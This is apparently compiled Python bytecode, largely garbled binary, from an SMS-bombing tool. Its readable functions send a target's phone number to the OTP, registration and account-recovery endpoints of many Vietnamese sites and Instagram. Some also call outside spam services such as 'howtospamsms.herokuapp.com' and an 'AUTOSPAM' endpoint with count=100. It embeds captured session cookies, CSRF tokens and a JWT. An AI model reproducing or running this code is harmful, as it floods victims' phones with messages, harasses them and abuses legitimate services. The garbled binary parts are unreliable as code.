ddddd�ddd| dd�         z   ii��  �        j         d S )Nz7https://api.tamo.vn/web/public/client/phone/sms-code-tszapi.tamo.vn�39r�   �application/json;charset=UTF-8r�   r�   r�   zhttps://www.tamo.vnr�   r�   r�   zhttps://www.tamo.vn/r�   )r!   r�   r#   r�   r�   r   r�   r�   r�   r�   r�   r�   r�   �mobilePhoner6   r%   r   r   rC   r�   r�   s    r:   �call2r{  �  s�   � �	��H�[h�{�  Kn�  d�  y}�  LF�  ]h�  sH�  [f�  y�  RY�  e{�  O	b	�  Sc	�  Sc	�  l	y	�  {	C
�  D
G
�  H
M
�  N
O
�  P
R
�  N
R
�  H
S
�  D
S
�  z	T
�  k	U
�  W
�  W
�  W
�  \
�  \
�  \
�  \
r<   c                 �   � t          j        ddddddddd	d
ddddddd�t          j        dd| dd�         z   i�  �        ��  �        j         d S )Nz4https://api.senmo.vn/api/user/send-one-time-passwordzapi.senmo.vnrf   zB"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"r�   r'   r�   r�   r  r   zhttps://senmo.vnr�   r�   r�   zhttps://senmo.vn/user/loginr�   )r!   r�   r�   r�   r$   r�   r   r�   r#   r�   r�   r�   r�   r�   r�   r   r5  r   r   r�   r8  r�   s    r:   �call3r}  �  s�   � �	��E�Xf�y}�  Lk�  |N�  bf�  {�  NH�  _l�  w|�  GY�  lw�  J	P	�  c	j	�  v	S
�  g
z
�  P{
�  P{
�  BF�  BL�  NU�  VZ�  [`�  ab�  ce�  ae�  [f�  Vf�  Mg�  Bh�  Bh�  i�  i�  i�  n�  n�  n�  nr<   c                 ��   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�}t          j        | d#d$��  �        }t          j        d%||�&�  �        }d S )'Nr!   zatmonline.com.vnr�   �46r�   r  r#   r�   r�   r�   r�   r�   r"   r   r   �uMozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36r�   r  r�   zhttps://atmonline.com.vnr�   r   r�   r�   r�   r�   r�   z�https://atmonline.com.vn/portal-new/login?mobilePhone=0777531398&requestedAmount=4000000&requestedTerm=4&locale=vn&designType=NEWr�   r�   r$   �Avi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4�cookiez5_ga_181P8FC3KD=GS1.1.1681739176.1.1.1681739193.43.0.0�ONLINE)rz  rq  zEhttps://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode�rA   r@   �rD   r�   rE   rG   �r   �Headers�DatasonrK   s       r:   �call4r�  �  s�  � � m�v�)�  m�*:�D�  m��  Om�  m�  nv�  x[�  m�  \j�  l~�  m�  Q�  SW�  m�  Xg�  ik�  m�  lx�  zq�  m�  rF�  HU�  m�  V^�  `z�  m�  {K�  MZ�  m�  [k�  ms�  m�  tD	�  F	M	�  m�  N	W	�  Y	I�  m�  J[�  ]p�  m�  qB�  De�  m�  fn�  pl�  m�G��j���A�A�B�B�G��}�d�ls�  ~E�  F�  F�  F�H�H�Hr<   c                 ��   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �}t          j        d!d"| d#d$�         � �i�  �        }t          j        d%||�&�  �        }d S )'Nr!   zapi.thantaioi.vnr�   rf   r�   r  r�   r�   r$   r'   r�   r�   r   r�  r�   r  r#   r   r�   zhttps://thantaioi.vnr�   r�   r�   r�   r�   r�   r�   zhttps://thantaioi.vn/user/loginr�   r�   r�  z5_ga_LBS7YCVKY6=GS1.1.1681807570.2.1.1681807596.34.0.0r   r5  r   r   z8https://api.thantaioi.vn/api/user/send-one-time-passwordr�  r�  r�  s       r:   �call5r�  �  su  � � I�v�)�  I�*:�D�  I��  Om�  I�  n|�  ~P�  I�  Qb�  dh�  I�  i{�  }A�  I�  BN�  PG�  I�  H\�  ^k�  I�  lt�  v{�  I�  |D�  F\�  I�  ]m�  oz�  I�  {K�  MS�  I�  Td�  fm�  I�  nw�  yZ	�  I�  [	l	�  n	A
�  I�  B
J
�  L
H�  I�G��j�'�#5��a��d��#5�#5�6�7�7�G��}�W�^e�ov�w�w�w�H�H�Hr<   c                 ��   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�}ddddddd d!d"d#d$d%d&d'd(�}| d)d*�}t          j        d+|||�,�  �         d S )-N�supportOnlineTalkID� Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6�__cfruidz3f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280�
XSRF-TOKENaV  eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D�	sessionidaV  eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D�utm_uidaV  eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D�ec_cache_utmz$2ecb18ca-827d-53c1-5f1a-7d106859d9e5�ec_cache_client�false�ec_cache_client_utmz�%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D�ec_png_client�
ec_png_utm�ec_etag_client�ec_png_client_utm�ec_etag_utm�ec_etag_client_utm�uid�client�
client_utmzrobocash.vnr   r�   rG  zhttps://robocash.vnzhttps://robocash.vn/register�("Not:A-Brand";v="99", "Chromium";v="112"r�   r  r�   r�   r   �vMozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36r&   r^  �(iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I)r   �_tokenz)https://robocash.vn/register/phone-resendr'  r�   �r   r�   r@   rA   s       r:   �call9r�  �  sz  � �#��&�#� �9�	#�
 � ]�#� � ]�#� � ]�#� �*�#� ��#� � X�!#�" ��%#�& �*�)#�* ��-#�. � X�1#�2 �*�5#�6 � X�9#�: 
�*�=#�> ��A#�B � X�E#�'�L ��>�F�#�-�;��%���#�|�(�#� �'�* �8�
� 
�$�
 �-�;����� � � � � r<   c                 �D   � t          j        d| dd�         � ��  �         d S )Nz1https://howtospamsms.herokuapp.com/meta-vn?phone=r   r   �rE   rF   r�   s    r:   �metar�     s)   � �	��O�%��"��+�O�O�P�P�P�P�Pr<   c                 �4   � t          j        d| � ��  �         d S )Nz/https://howtospamsms.herokuapp.com/vieon?phone=r�  r�   s    r:   �vieonr�    s!   � �	��G��G�G�H�H�H�H�Hr<   c           	      �P   � t          j        dd| � d�ddddd��	�  �        j         d S )
Nz>https://www.instagram.com/accounts/account_recovery_send_ajax/zemail_or_username=z&recaptcha_challenge_field=r  r&   zsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36� EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD)r�   r*   r-   zx-csrftokenr�  )rE   rG   rD   r�   s    r:   �fbr�    s}   � �	��O�  VM�jo�  VM�  VM�  VM�  fI�  ]m�  {p�  @b�  Vc�  Vc�  d�  d�  d�  i�  i�  i�  ir<   c                 �4   � t          j        d| � ��  �        }d S )Nz=https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=r�  rC  s     r:   �winmartr�    s   � ��|�c�\a�c�c�d�d�H�H�Hr<   c                 �   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�}d#d$d%| d&d&d'd(�}t          j        d)||�*�  �        }d S )+Nr!   zconcung.comr�   �121r�   �A"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"r#   r   r�   rG  rH  r&   r�   r�   r   �oMozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534r�   r  r�   zhttps://concung.comr�   r   r�   r�   r�   r�   r�   z"https://concung.com/dang-nhap.htmlr�   r�   r$   r�  r�  z5_ga_BBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0r�   �	AjaxLogin�sendOtpLoginr%   zkhach-hang.html)�ajax�	classAjax�
methodAjax�customer_phone�id_customer�momoapp�backzhttps://concung.com/ajax.htmlr�  r�   �r   r�  �PayloadrK   s       r:   �concungr�    s�  � � j�v�}�  j�%5�u�  j�[�  Ki�  j�  jr�  ty�  j�  zH�  JA�  j�  BT�  Vf�  j�  gy�  {�  j�  @L�  N�  j�  @T�  Vc�  j�  dl�  nC�  j�  DT�  Vc�  j�  dt�  v|�  j�  }M	�  O	V	�  j�  W	`	�  b	F
�  j�  G
X
�  Z
m
�  j�  n

�  Ab�  j�  ck�  mi�  j�G���.�ch�x{�  HK�  Te�  f�  f�G��}�<�7�T[�\�\�\�H�H�Hr<   c                 �4   � t          j        d| � ��  �        }d S )NzIhttps://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile=r�  rC  s     r:   �	daihocfptr�    s   � ��|�o�hm�o�o�p�p�H�H�Hr<   c                 �   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �}| d!d"�}t          j        d#||�$�  �        }d S )%Nr!   znhadat.cafeland.vnr�   rY  r#   r]  r�   rG  rH  r&   r�   r�   r   r�  r�   r  r�   zhttps://nhadat.cafeland.vnr�   r   r�   r�   r�   r�   r�   z'https://nhadat.cafeland.vn/dang-ky.htmlr�   r�   r$   r�  r�  a  laravel_session=eyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D�(bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w)�mobiler�  z+https://nhadat.cafeland.vn/member-send-otp/r�  r�   r�  s       r:   �cafelandr�    s^  � � W�v�+�  W�,<�d�  W�8�  NC�  W�  DR�  TK�  W�  L^�  `p�  W�  qC�  EI�  W�  JV�  XO�  W�  Pd�  fs�  W�  t|�  ~Z�  W�  [k�  mz�  W�  {K�  MS�  W�  Td�  fm�  W�  nw�  yb	�  W�  c	t	�  v	I
�  W�  J
[
�  ]
~�  W�  G�  IV�  W�G��)S�U�U�G��}�J�QX�bi�j�j�j�H�H�Hr<   c                 �\   � ddddddddd	d
dddd�}d| i}t          j        d||��  �         d S )N�api.dongplus.vnr   r'   r�   �https://dongplus.vn�https://dongplus.vn/user/loginr�  r�   r  r�   r�   r�   r�  �r�   r#   r$   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   �7https://api.dongplus.vn/api/user/send-one-time-passwordrC   r�   )r   r@   rJ   s      r:   �call10r�    ss   � � �	����$�.����
��|�5� �'�< �U��)� �-�I��� �  �  �  �  �  r<   c                 �v   � ddddddddd	d
dddddd�}| dd�         dddd�}t          j        d||��  �        }d S )Nzapi.moneydong.vip�72r�  r�   r  r�   r�  r  zhttps://h5.moneydong.vipr�   r�   r�   zhttps://h5.moneydong.vip/r�   r�  �r!   r�   r�   r#   r�   r�   r   r�   r�   r�   r�   r�   r�   r�   r$   r   r   r(   r�   � 69ad075c94c279e43608c5d50b77e8b9)r   r  �ctype�chntokenz2https://api.moneydong.vip/h5/LoginMessage_ultimater�  r�   r�  s       r:   �	moneydongr�  =  s�   � �*�T�  Pn�  y\�  mP�  ei�  xi�  @M�  Xr�  EP�  ci�  |C	�  O	j	�  ~	Q
�  e
F�  G�  G�G��a��d��S�3�Ln�o�o�G��}�Q�X_�ip�q�q�q�H�H�Hr<   c                 ��   � i dd�dd�dd�dd�d	d
�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�}t          j        | d d!��  �        }t          j        d"||�#�  �        }d S )$Nr!   zapi.gotadi.comr�   �44r�   r�  r#   r�   r�   r  zgtd-client-tracking-device-idz$85519cab-85d7-4881-abfa-65d2a2bb3a52r�   r�   r   r�  r�   r�   zhttps://www.gotadi.comr�   r�   r�   r�   r�   r�   r�   zhttps://www.gotadi.com/r�   r�   r$   r�  �VI)r.   �languagezChttps://api.gotadi.com/b2c-web/api/register/phone-number/resend-otpr�  r�  r�  s       r:   �gotadir�  B  st  � � f�v�'�  f�(8�$�  f�{�  Mk�  f�  lt�  vH�  f�  I]�  _l�  f�  mL�  Nt�  f�  uG�  IM�  f�  NZ�  \M�  f�  N\�  ^p�  f�  qy�  {S�  f�  Td�  fq�  f�  rB	�  D	J	�  f�  K	[	�  ]	d	�  f�  e	n	�  p	I
�  f�  J
[
�  ]
p
�  f�  q
B�  De�  f�G��j��$�?�?�@�@�G��}�b�ip�  {B�  C�  C�  C�H�H�Hr<   c                 �   � ddddddddd	d
dd�}t          j        d| dd�         i�  �        }t          j        d||��  �        }d S )Nz
funring.vnr  �28r   r�  r�   zhttp://funring.vnz,http://funring.vn/module/register_mobile.jspr  r�  z�JSESSIONID=NODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga=GA1.2.1626827841.1679236846; _gid=GA1.2.888694467.1679236846; _gat=1)r!   r  r  r)   r-   r�   r  r  r  r+   �Cookiere  r   r   z/http://funring.vn/api/v1.0.1/jersey/user/getotpr�  r�  r�  s       r:   �funringr�  G  s�   � �#�,�QU�`e�  uf�  wI�  Tg�  sa�  uD�  Xy�  DZ
�  [
�  [
�G��j�*�e�A�b�D�k�2�3�3�G��}�N�U\�fm�n�n�n�H�H�Hr<   c                 �x   � dddd�}ddddd	d
ddddddddd�}d| dddddd�}t          j        d|||��  �         d S )Nz643d8607c6ffe8.92935100z,o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=�rfsd6jmf1e0daeapvmv1p0i6bu)�OnCredit_idz-fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef�SN5c8116d5e6183zoncredit.vnr]  r�   rG  zhttps://oncredit.vnz https://oncredit.vn/registrationr�  r�   r  r�   r�   r   r�  r&   r^  �sendCodeRegztv5v4v4v4c@gmail.comr�   r'   �CSRFGuard_ajax�@t8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi)zdata[typeData]zdata[phone]zdata[email]zdata[captcha1]z
data[lang]�CSRFName�	CSRFTokenzhttps://oncredit.vn/?ajaxr'  r�   r�  s       r:   �call11r�  L  s�   � �,�2�3�	� �'� �>�>�F�#�1�;��%���#�|�(�#� �'�, �	�����F�
� 
�$�" �-�+����� � � � � r<   c                 �   � ddddddddd	d
dddddd�}t          j        | ddd��  �        }t          j        d||��  �        }d S )Nzapi.fptplay.netr�   r  r�   zapplication/json; charset=UTF-8r�   r�  r  zhttps://fptplay.vnr�   r�   r�   zhttps://fptplay.vn/r�   r�  r�  �VN� vKyPNd1iWHodQVknxcvZoWz74295wnk8)r   �country_code�	client_idz�https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=Eim9hpobCZPoIoVVokkIDA&e=1681802671&device=Chrome(version%253A112.0.0.0)&drm=1r�  r�  r�  s       r:   �fptplayr�  ~  s�   � �(�4�  Nl�  wZ�  kQ�  fj�  yp�  GT�  _s�  FR�  ek�  ~E	�  Q	f	�  z	M
�  a
B�  C�  C�G��j�5��Ik�l�l�m�m�G��}�  M�  T[�  el�  m�  m�  m�H�H�Hr<   c                 �L  � t          j        d�  �        j        }|�                    d�  �        d         �                    d�  �        d         }i dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d�d!d"�d#d�d$d%�d&d'd(��}|| d)�}t          j        d||�*�  �        }d S )+Na,  https://oauth.vietid.net/rb/login?next=https%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252Fzname="csrf-token" value="r   z"/>r   r!   zoauth.vietid.netr�   �41r  r  r�   r�  r�   r�   r�   r  r"  r�   r�   zhttps://oauth.vietid.netr�   r  r   r�  r#   r  r�   r   r�   r  r!  r�   r  r�   r�   r�   r�  z4_ga_H5VRTZBFLG=GS1.1.1679234987.1.0.1679234987.0.0.0)r$   r�  )z
csrf-tokenr�   r�  )rE   rG   rH   �split)r   �csrfget�csrfr�  r�  rK   s         r:   �vietidr�  �  s�  � ��m�  P�  Q�  Q�  V�G��=�=�4�5�5�a�8�>�>�u�E�E�a�H�D� A�v�)�  A�*:�D�  A��Rb�  A�cn�  qO�  A�  Pb�  dh�  A�  i}�  L�  A�  Mh�  jm�  A�  nv�  xR�  A�  Sa�  cF�  A�  GS�  UF�  A�  GO�  Qn
�  A�  o

�  AN�  A�  O_�  ak�  A�  l|�  ~B�  A�  CS�  U_�  A�  `i�  k^�  A�  _p�  rE�  A�  Yz�  E@�  A�  A�  A�G�!�U�3�3�G��}�  Q�  X_�  ip�  q�  q�  q�H�H�Hr<   c                 ��   � t          d�  �        }dddddddd	d
ddddddd�}t          j        | dd�         � d|� d�ddd��  �        }t          j        d||��  �        }d S )N�   zapi.ahamove.com�114r�  r�   ry  r�   r�  r  zhttps://app.ahamove.comr�   r�   r�   zhttps://app.ahamove.com/r�   r�  r�  r   r   u   Tuấnz
@gmail.comr�  �true)r�  rb  r�   r�  �firebase_sms_authz3https://api.ahamove.com/api/v3/public/user/registerr�  )r;   rD   r�   rE   rG   )r   �mailr�  r�  �Responses        r:   �ahamover�  �  s�   � �����D�(�5�  Om�  x[�  lQ�  fj�  yj�  AN�  Yr�  EP�  ci�  |C	�  O	i	�  }	P
�  d
E�  F�  F�G��j�e�A�b�D�k�#3�8�t�L_�L_�L_�os�  IO�  P�  P�  Q�  Q�G��}�R�Y`�jq�r�r�r�H�H�Hr<   c                 �~   � ddddddddd	d
dddddd�}ddd�}| dddddddddd�
}t          j        d|||��  �        }d S )Nzapi.vieon.vn�201r�   r  r�   a3  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4r�  r  zhttps://vieon.vnr�   r�   r�   au  https://vieon.vn/?utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite&utm_content=p_--k_vieon&pid=approi&c=approi_VieON_SEM_Brand_BOS_Exact&af_adset=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B&af_force_deeplink=false&gclid=CjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwEr�   r�  )r!   r�   r#   r�   r�   r"   r   r�   r�   r�   r�   r�   r�   r�   r$   �
mobile_web�012021)r,   �ui�Vexx007r   � 7c775cd1cd49a31c3893ca1e09abbde3zAndroid%2010zChrome%2F110�desktop)
r   r�   �
given_name�	device_idr,   �model�
push_token�device_name�device_typer�  z1https://api.vieon.vn/backend/user/register/mobile)r?   rA   r@   r�   )r   r�  �Paramsr�  rK   s        r:   �vieon1r
  �  s�   � �%��Hk�  }`�  uy�  K@�  O@�  Wd�  oA�  T_�  rx�  KR�  ^j�  ~Q�  eF�  G�  G�G�&�X�6�6�F�$���Y{�  IU�  _m�  |~�  N\�  lu�  |D�  E�  E�G��}�P�Y_�fm�w~����H�H�Hr<   c                 �R   � t          j        dt          t          ��  �        j        }d S )Nz*https://tiki.vn/api/v2/customers/otp_codesrC   )rE   rG   r�   �jsdtrH   )r   �response_tikis     r:   �tikir  �  s"   � ���K�UW�^b�c�c�c�h���r<   c                 �X   � d�                     | �  �        }t          j        |�  �         d S )Nz=https://api.huykaiser.me/API/AUTOSPAM/spam?count=100&phone={})�formatrE   rG   )r   �urls     r:   r=  r=  �  s,   � �
I�
P�
P�QV�
W�
W�C��M�#�����r<   c                 ��   � t          j        dt          t          ��  �        �                    �   �         }|d         d         }t          j        d|� d�t          ��  �        �                    �   �         }d S )Nz"https://moca.vn/moca/v2/users/roler>   rA   �registrationIdz,https://moca.vn/moca/v2/users/registrations/z/verification)r@   )rE   rF   �paramss�headerssrD   rG   )r   �homerI   rK   s       r:   �mocar  �  sf   � ���9�'�S[�\�\�\�a�a�c�c��	�f��&�	'���M�]��]�]�]�go�p�p�p�u�u�w�w���r<   c                 �z   � | t          d�  �        d�}t          j        d|��  �        �                    �   �          d S )N�(   )r   �hashzDhttps://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone)rD   )r;   rE   rG   rD   )r   rJ   s     r:   �gbayr  �  s@   � �#�M�"�,=�,=�?�?��	��U�\e�f�f�f�k�k�m�m�m�m�mr<   c                 �   � ddddddddd	d
d�
}i dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d#�d$d%�d&d'�d(d)�d*d+�}| d,d-�}t          j        d.|||�/�  �        }d S )0N�(XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpvz1.1.307401310.1685096321zGA1.2.1786782073.1685096321zfb.1.1685096322884.1341401421za2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1z!https://vietteltelecom.vn/dang-kyz%GS1.1.1685096321.1.1.1685096380.1.0.0zGA1.2.1385846845.1685096321r�   z�eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D)
�laravel_sessionr�   r�   r�   �__zi�redirectLogin�_ga_VH8261689Qr�   z_gat_UA-58224545-1r�  r)   r�   r+   r�   r  r  r�   ry  r  zhttps://vietteltelecom.vnr  z#https://vietteltelecom.vn/dang-nhap�Sec-Fetch-Destr�   �Sec-Fetch-Moder�   �Sec-Fetch-Siter   r-   r�   �X-CSRF-TOKEN�(dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6r*   r&   �X-XSRF-TOKENz�eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==r�   r�   r�   r�   r�   r�   r   )r   r  z+https://vietteltelecom.vn/api/get-otp-loginr�   r�   r�   s        r:   �viettelr(  �  s8  � �E�-�-�/�s�<�A�,�!� U�� �G���5���U�� 	�l�� 	�8�	� 	�-�� 	�8�� 	�'�� 	�&�� 	�-�� 	�  H�� 	�B�� 	�,�� 	�  S�� 	�X��  	�D�!�" 	�k�#�G�* ��� �I�
 �}�J�T[�el�s|�}�}�}�H�H�Hr<   c                 �   � ddddd�}i dd�dd	�d
d�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd �d!d"�d#d$�}d%| i}t          j        d&|||�'�  �        }d S )(N�(7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2zW2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1zhttps://viettel.vn/dang-kyz�eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D)r  r  r   r�  r)   r�   r+   r�   r  r  r�   ry  r  zhttps://viettel.vnr  r"  r�   r#  r�   r$  r   r-   r�   r%  �(HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBKr*   r&   r'  z�eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==r�   r�   r�   r�   r�   r�   r  zhttps://viettel.vn/api/get-otpr�   r�   r�   s        r:   �dkvtr,  �  s  � �E�i�5� Q�	� �G���5���U�� 	�l�� 	�8�	� 	�&�� 	�/�� 	�'�� 	�&�� 	�-�� 	�  H�� 	�B�� 	�,�� 	�  O�� 	�X��  	�D�!�" 	�k�#�G�* 	�%��I� �}�=�w�X_�fo�p�p�p�H�H�Hr<   c                 �   � dddddddddd	d
